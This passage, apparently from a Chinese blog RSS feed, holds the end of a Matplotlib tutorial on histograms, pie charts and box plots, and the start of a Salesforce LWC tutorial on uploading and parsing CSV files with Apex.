&lt;p&gt;这里有一个新的参数where，你可以分别运行这三段代码，可以看到图形好像是在往右边移动，显示结果如下图所示：&lt;br/&gt;代码1：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601277840243-d58a2d13-7cb7-4271-b0f2-b203edc1013a.png#align=left&amp;amp;display=inline&amp;amp;height=697&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1394&amp;amp;originWidth=1836&amp;amp;size=272714&amp;amp;status=done&amp;amp;style=none&amp;amp;width=918&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;代码2：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601277875322-47c59867-056e-4fb1-927f-dc12fcad653f.png#align=left&amp;amp;display=inline&amp;amp;height=680&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1360&amp;amp;originWidth=1798&amp;amp;size=320421&amp;amp;status=done&amp;amp;style=none&amp;amp;width=899&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;代码3：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601277905394-c9376501-d741-4045-bf83-6d616a9e20cd.png#align=left&amp;amp;display=inline&amp;amp;height=696&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1392&amp;amp;originWidth=1814&amp;amp;size=296687&amp;amp;status=done&amp;amp;style=none&amp;amp;width=907&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;where参数主要用来定义step应该放在哪里，我们把图形中的每条横线可以看作一个step，where字段一共有三个取值，分别是：pre，mid和post，如果我们在x为1和2的两个位置上画一条横线（如上图红线所示），你会发现，当where='pre'时，y取值的第一个点应该是在x第一个点左侧一些，当where='mid'时，y取值的第一个点应该是在x第一个点中间，y取值的第一个点应该是在x第一个点右侧。&lt;/p&gt;
&lt;h3 id=&quot;四-实例项目自由绘图&quot;&gt;四 实例项目自由绘图&lt;/h3&gt;
&lt;h4 id=&quot;1-直方图&quot;&gt;1 直方图&lt;/h4&gt;
&lt;p&gt;直方图擅长展示区间分布，比如某一科目的考试成绩，按照地区统计的人均寿命，发达国家与发展中国家人均可支配收入等等，现在我们需要绘制某个班级中Python语言考试成绩的分布区间图。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

scores = np.random.randint(0, 100, 100)
bins = range(0, 101, 10)

&quot;&quot;&quot;
histtype在这里有三个参数，分别是bar，step和stepfilled
1 bar就是填满相应颜色
2 step是阶梯图
3 histtype是生成一个默认的lineplot进行图形填充填充，恰好这个参数的默认值就是bar
&quot;&quot;&quot;
plt.hist(x=scores, bins=bins, color='#3366FF', histtype='bar')
plt.xlabel('Python考试成绩')
plt.ylabel('学生成绩')

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601373413184-26d0dfd9-375d-4077-ae57-262d0c9a6c02.png#align=left&amp;amp;display=inline&amp;amp;height=453&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=906&amp;amp;originWidth=1170&amp;amp;size=119557&amp;amp;status=done&amp;amp;style=none&amp;amp;width=585&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;在这里我们有必要重新再来说一下关于直方图与柱状图，因为他们的样子实在是太像了，只是柱体与柱体之间是否存在空隙，但恰恰是由于这一点，才让它们有所区别，也让它们分为擅长表示不同类型的数据。我们知道数据可以分为连续型数据和离散型数据，这里我们可以对它们进行总结。直方图擅长总结和描述连续型数据的分布，而柱状图更加的擅长描述和总结离散型数据的分布，所以你在未来的应用场景中，首先判断数据的特点，然后再决定使用什么图形去描述这些数据。&lt;/p&gt;
&lt;h4 id=&quot;2-堆叠直方图&quot;&gt;2 堆叠直方图&lt;/h4&gt;
&lt;p&gt;现在我们要绘制一个基于刚刚的场景之上的另外一个场景，就是我们要比较两个班级的Python语言考试的成绩，对它们的分布情况进行分别的比对，这时就需要用到堆叠直方图。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# 中文显示
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# 1 分别生成两个班级的分数
scores1 = np.random.randint(0, 100, 100)
scores2 = np.random.randint(0, 100, 100)

# 2 把两个班级的分数放在一个列表中
x = [scores1, scores2]

# 3 选择两个对比较鲜明的颜色
colors = ['r', 'b']

# 4 声明两个标签
labels = ['一班', '二班']

# 5 设定x轴的范围
bins = range(0, 101, 10)

&quot;&quot;&quot;
新加入的参数的意义：
1 rwidth:柱体的宽度，0.0-1.0
2 stack:上下排还是左右排
&quot;&quot;&quot;
plt.hist(x, color=colors, histtype='bar', rwidth=1.0, stacked=False, label=labels)
plt.xlabel('Python成绩分布')
plt.ylabel('人数')
plt.title('不同班级的Python成绩直方图')

plt.legend(loc=1)  # 原来用upper right这些，现在1表示右上，234分别对应逆时针旋转位置
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601374577302-582f0425-c612-47dd-ab3a-a6a94308cc8f.png#align=left&amp;amp;display=inline&amp;amp;height=456&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=912&amp;amp;originWidth=1180&amp;amp;size=159007&amp;amp;status=done&amp;amp;style=none&amp;amp;width=590&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;3-分裂式饼图&quot;&gt;3 分裂式饼图&lt;/h4&gt;
&lt;p&gt;饼图是用来展示定性数据分布比例特征的统计图形，在数据可视化时应用的非常广泛，我们可以通过绘制饼图，直观的观察出数据的占比情况。饼图同样适用于离散型数据的占比情况，比如班级内男女性别比例，公司销售业绩每月在全年中的占比情况等等。对于比例分布的场景，饼图都是非常适合的。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

labels = ['第一季度', '第二季度', '第三季度', '第四季度']
sale = [20, 40, 30, 70]
colors = ['r', 'b', 'y', 'green']

explode = (0.1, 0.1, 0.1, 0.1)

plt.pie(
    sale,
    explode=explode,  # 裂开的那条缝的宽度
    labels=labels,
    autopct='%.2f%%',  # %的精度
    startangle=10,  # 从x轴为起始位置，逆时针旋转的角度
    shadow=True,  # 阴影
    colors=colors
)

plt.title('每一季度销售额', loc='right')
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601375915766-b64c2523-5103-4dff-9af5-88f415af4d95.png#align=left&amp;amp;display=inline&amp;amp;height=445&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=890&amp;amp;originWidth=1244&amp;amp;size=181273&amp;amp;status=done&amp;amp;style=none&amp;amp;width=622&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;4-内嵌环形饼图&quot;&gt;4 内嵌环形饼图&lt;/h4&gt;
&lt;p&gt;内嵌环形饼图式使得饼图不仅可以展示单一数据集的比例情况，还可以对比展示多数据集的分布情况。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

development_language = ['Java', 'Python', 'C++', 'PHP', 'Scala']

weight1 = [40, 20, 30, 15, 15]
weight2 = [25, 35, 30, 12, 13]

colors = ['#FF6600', '#9966FF', '#663333', '#3399CC', '#666600']

wedges1, texts1, autotexts1 = plt.pie(
    weight1,
    autopct='%.1f%%',
    radius=1,
    pctdistance=0.85,
    colors=colors,
    textprops=dict(color='w'),
    wedgeprops=dict(width=0.3, edgecolor='w')
)

&quot;&quot;&quot;
饼图的创建其实是有三个返回值的：
1 一个序列，matplotlib.patches.Wedge的实例
2 一个列表，matplotlib.text.Text的实例，是label的列表
3 一个列表，matplotlib.text.Text的实例，是数值的文本实例标签，只有在参数autopct不为空的时候才有效
&quot;&quot;&quot;
print(wedges1)
print(texts1)
print(autotexts1)

wedges2, texts2, autotexts2 = plt.pie(
    weight2,
    autopct='%.1f%%',
    radius=0.75,
    pctdistance=0.75,
    colors=colors,
    textprops=dict(color='w'),
    wedgeprops=dict(width=0.5, edgecolor='b')  # 边框
)

plt.legend(
    weight1,
    development_language,
    fontsize=5,
    title='开发语言占比',
    loc='center left',
    bbox_to_anchor=(0.91, 0, 0.3, 1)
)

# 调整饼图外圈中的字体
plt.setp(autotexts1, size=10, weight='bold')

# 调整饼图内圈中的字体
plt.setp(autotexts2, size=15, weight='bold')

plt.title('开发语言使用人数比例表')
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601378280688-1150254a-2860-46ac-a0c3-427f7deda9da.png#align=left&amp;amp;display=inline&amp;amp;height=419&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=838&amp;amp;originWidth=1130&amp;amp;size=159030&amp;amp;status=done&amp;amp;style=none&amp;amp;width=565&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;综上代码，其实，饼图的嵌套，就是画两个饼图，不要让他们重叠。&lt;/p&gt;
&lt;h4 id=&quot;5-箱型图&quot;&gt;5 箱型图&lt;/h4&gt;
&lt;p&gt;箱型图主要应用在一系列测量或者比较数据的观测中，比如学校与学校之间或者班级与班级之间的成绩比较，各个运动员之间的体能比较，产品优化前和产品优化后的各项数据指标展现的结果比较等等，箱型图是数据分析场景应用的比较多的一种数据可视化图形。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# 生成正态分布数据
test1 = np.random.randn(5000)
test2 = np.random.randn(5000)

test_list = [test1, test2]

labels = ['随机数生成1', '随机数生成2']

colors = ['#3399FF', '#CCCCFF']

box_plot = plt.boxplot(
    test_list,
    whis=1.5,  # 上下四分位距离
    widths=0.6,
    sym='o',
    labels=labels,
    patch_artist=True,  # 是否给箱体添加颜色
    notch=True  # 是否中间v型凹陷
)

for patch, color in zip(box_plot['boxes'], colors):
    patch.set_facecolor(color)


plt.ylabel('随机数值')
plt.title('生成器抗干扰能力的稳定性比较')

plt.grid(axis='y', ls=':', lw=1, color='gray', alpha=0.2)

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;图形显示结果如下图所示：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601397506272-30b34c7b-3475-4361-9e5f-503e3c52880b.png#align=left&amp;amp;display=inline&amp;amp;height=453&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=906&amp;amp;originWidth=1206&amp;amp;size=101946&amp;amp;status=done&amp;amp;style=none&amp;amp;width=603&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;以上是我们绘制的一些常用的图形和一些常用的参数，当然Matplotlib绘制图形的能力远不止于此，但如果每一个图形都一一讲一遍的话，那么内容会全部都由画图来组成了。画图的重点是要学习画图的思想，遇到问题先不要急于去画，首先一定要选定一个合适的图形，然后再动手。最核心的图形无非就是那几个常用的，我们都已经进行过了多次的练习。画图是数据分析、数据挖掘、AI方向的算法工程师必备的技能，所以一定要多多的练习它们的绘制。我们还会在后续的章节中不断的去使用这些图形的练习。&lt;/p&gt;&lt;p&gt;最后会有一个小练习，请点击下方链接下载题目和数据：&lt;br/&gt;&lt;a href=&quot;https://www.yuque.com/attachments/yuque/0/2020/zip/281865/1601397919398-0586cc42-2464-48d2-aafd-345531f7c8df.zip?_lake_card=%7B%22uid%22%3A%221601397917739-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F281865%2F1601397919398-0586cc42-2464-48d2-aafd-345531f7c8df.zip%22%2C%22name%22%3A%22chapter8-1.zip%22%2C%22size%22%3A5582276%2C%22type%22%3A%22application%2Fzip%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22xFoz4%22%2C%22card%22%3A%22file%22%7D&quot;&gt;chapter8-1.zip&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 29 Sep 2020 16:51:00 +0000</pubDate>
<dc:creator>马一特</dc:creator>
<og:description>一 图的基本构成 Matplotlib是数据可视化工作中，最常用的一个可视化库。Matplotlib有非常多的图形，我们很难在短时间内将其掌握，所以我们首先要掌握的是画图的思路和常用的一些图形。创建一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mayite/p/13752591.html</dc:identifier>
</item>
<item>
<title>Salesforce LWC学习(二十七) File Upload - zero.zhang</title>
<link>http://www.cnblogs.com/zero-zyq/p/13749103.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zero-zyq/p/13749103.html</guid>
<description>&lt;p&gt;本篇参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.salesforce.com/docs/component-library/bundle/lightning-file-upload/documentation&quot; target=&quot;_blank&quot;&gt;https://developer.salesforce.com/docs/component-library/bundle/lightning-file-upload/documentation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.salesforce.com/docs/component-library/bundle/lightning-input/specification&quot; target=&quot;_blank&quot;&gt;https://developer.salesforce.com/docs/component-library/bundle/lightning-input/specification&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在salesforce中，上传附件是一个经常做的操作，在标准的功能基础上，lwc自然也封装了自定义的实现。我们有上传文档需求的时候，通常有以下的几点需求和考虑：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;是否支持多文件上传&lt;/li&gt;
&lt;li&gt;是否支持大文件上传&lt;/li&gt;
&lt;li&gt;是否可以限制上传文件的类型&lt;/li&gt;
&lt;li&gt;是否可以对文件进行解析(目前demo中仅限csv)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;根据上述的几点需求和考虑，本篇采用两种方式来实现文件上传操作来契合这些要求。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一. lightning-file-upload实现大文件上传&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用此种方式的优缺点：&lt;/p&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;支持大文件上传；&lt;/li&gt;
&lt;li&gt;可以限制上传文件类型；&lt;/li&gt;
&lt;li&gt;支持多文件上传；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;缺点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;不支持文件解析。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;demo如下：&lt;/p&gt;
&lt;p&gt;fileUploadSample.html：上面的链接中给出了 lightning-file-upload的使用方法，通过设置 label展示上传组件的label名称，record-id用来指定当前上传的这些文件将作为 note &amp;amp; Attachment绑定在哪条数据下，accept指定了限制的格式， uploadfinished是组件自身封装的事件，用于上传完成之后执行的事件，multiple设置 true/false来指定当前的组件是否支持多个文件上传。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-card &lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;=&quot;File Upload&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-file-upload
            &lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;=&quot;上传附件&quot;&lt;/span&gt;&lt;span&gt;
            name&lt;/span&gt;&lt;span&gt;=&quot;fileUploader&quot;&lt;/span&gt;&lt;span&gt;
            accept&lt;/span&gt;&lt;span&gt;={acceptedFormats}
            &lt;/span&gt;&lt;span&gt;record-id&lt;/span&gt;&lt;span&gt;={recordId}
            &lt;/span&gt;&lt;span&gt;onuploadfinished&lt;/span&gt;&lt;span&gt;={handleUploadFinishedEvent}
            &lt;/span&gt;&lt;span&gt;multiple&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-file-upload&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-card&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;fileUploadSample.js：方法用来指定当前只接受csv，上传成功以后toast信息展示相关的上传文件名称。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
import { LightningElement, api } from 'lwc'&lt;span&gt;;
import {ShowToastEvent} from &lt;/span&gt;'lightning/platformShowToastEvent'&lt;span&gt;;
export &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt; class FileUploadSample extends LightningElement {
    @api recordId;

    get acceptedFormats() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ['.csv'&lt;span&gt;];
    }
    handleUploadFinishedEvent(event) {
        const uploadedFiles &lt;/span&gt;=&lt;span&gt; event.detail.files;
        let uploadedFilesName &lt;/span&gt;= uploadedFiles.map(element =&amp;gt;&lt;span&gt; element.name);
        let uploadedFileNamesStr &lt;/span&gt;= uploadedFilesName.join(','&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.dispatchEvent(
            &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ShowToastEvent({
                title: &lt;/span&gt;'Success'&lt;span&gt;,
                message: uploadedFiles.length &lt;/span&gt;+ ' Files uploaded Successfully: ' +&lt;span&gt; uploadedFileNamesStr,
                variant: &lt;/span&gt;'success'&lt;span&gt;,
            }),
        );
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;结果展示：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. 页面初始化样子&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929124822240-1209223514.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 2. 上传两个文件的UI效果，点击done即调用 onuploadfinished这个对应的handler&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929124946253-943227417.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 3. 展示toast消息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929125010915-1517314010.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 4. 上传的文件正常的挂到了 Notes &amp;amp; Attachment上面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/910966/202009/910966-20200929125132523-972842181.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;二. lightning-input 实现csv文件上传以及解析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;此种方法优点&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;支持上传文件解析&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此种方法缺点&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;对文件上传大小有严格限制&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;demo如下：&lt;/p&gt;
&lt;p&gt; FileUploadUsingInputController：用于存储文件以及对csv内容进行解析，需要注意的是，当前方法只针对单个csv的单个sheet页进行解析。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; with sharing &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FileUploadUsingInputController {
    @AuraEnabled
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; String saveFile(Id recordId, String fileName, String base64Data) {
        base64Data &lt;/span&gt;= EncodingUtil.urlDecode(base64Data, 'UTF-8'&lt;span&gt;);
        Blob contentBlob &lt;/span&gt;=&lt;span&gt; EncodingUtil.base64Decode(base64Data);
        String content &lt;/span&gt;= bitToString(contentBlob, 'UTF-8'&lt;span&gt;);
        content &lt;/span&gt;= content.replaceAll('\r\n', '\n'&lt;span&gt;);
        content &lt;/span&gt;= content.replaceAll('\r', '\n'&lt;span&gt;);
        String[] fileLines &lt;/span&gt;= content.split('\n'&lt;span&gt;);
        System.debug(&lt;/span&gt;'*** ' +&lt;span&gt; JSON.serialize(fileLines));
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(Integer i = 1; i &amp;lt; fileLines.size(); i++&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;TODO 遍历操作&lt;/span&gt;
            system.debug('execute'&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; inserting file&lt;/span&gt;
        ContentVersion cv = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ContentVersion();
        cv.Title &lt;/span&gt;=&lt;span&gt; fileName;
        cv.PathOnClient &lt;/span&gt;= '/' +&lt;span&gt; fileName;
        cv.FirstPublishLocationId &lt;/span&gt;=&lt;span&gt; recordId;
        cv.VersionData &lt;/span&gt;=&lt;span&gt; EncodingUtil.base64Decode(base64Data);
        cv.IsMajorVersion &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        Insert cv;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 'successfully'&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; String bitToString(Blob input, String inCharset){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;转换成16进制&lt;/span&gt;
        String hex =&lt;span&gt; EncodingUtil.convertToHex(input);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;一个String类型两个字节 32位（bit）,则一个String长度应该为两个16进制的长度，所以此处向右平移一个单位，即除以2
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;向右平移一个单位在正数情况下等同于除以2，负数情况下不等
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;eg 9  00001001  &amp;gt;&amp;gt;1 00000100   结果为4&lt;/span&gt;
        &lt;span&gt;final&lt;/span&gt; Integer bytesCount = hex.length() &amp;gt;&amp;gt; 1&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;声明String数组，长度为16进制转换成字符串的长度&lt;/span&gt;
        String[] bytes = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; String[bytesCount];
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(Integer i = 0; i &amp;lt; bytesCount; ++&lt;span&gt;i) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;将相邻两位的16进制字符串放在一个String中&lt;/span&gt;
            bytes[i] =  hex.mid(i &amp;lt;&amp;lt; 1, 2&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;解码成指定charset的字符串&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt; EncodingUtil.urlDecode('%' + String.join(bytes, '%'&lt;span&gt;), inCharset);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;fileUploadUsingInput.html:展示上传组件以及button&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-card &lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;=&quot;File Upload Using Input&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-layout &lt;/span&gt;&lt;span&gt;multiple-rows&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-layout-item &lt;/span&gt;&lt;span&gt;size&lt;/span&gt;&lt;span&gt;=&quot;12&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-input &lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;file uploader&quot;&lt;/span&gt;&lt;span&gt; onchange&lt;/span&gt;&lt;span&gt;={handleFilesChange} &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;file&quot;&lt;/span&gt;&lt;span&gt; accept&lt;/span&gt;&lt;span&gt;={acceptedType}&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-input&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;slds-text-body_small&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;{fileName}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-layout-item&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-layout-item&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-button &lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;={UploadFile} &lt;/span&gt;&lt;span&gt;onclick&lt;/span&gt;&lt;span&gt;={handleSave} &lt;/span&gt;&lt;span&gt;variant&lt;/span&gt;&lt;span&gt;=&quot;brand&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-button&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-layout-item&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-layout&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;template &lt;/span&gt;&lt;span&gt;if:true&lt;/span&gt;&lt;span&gt;={showLoadingSpinner}&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;lightning-spinner &lt;/span&gt;&lt;span&gt;alternative-text&lt;/span&gt;&lt;span&gt;=&quot;Uploading now&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;lightning-spinner&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;template&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
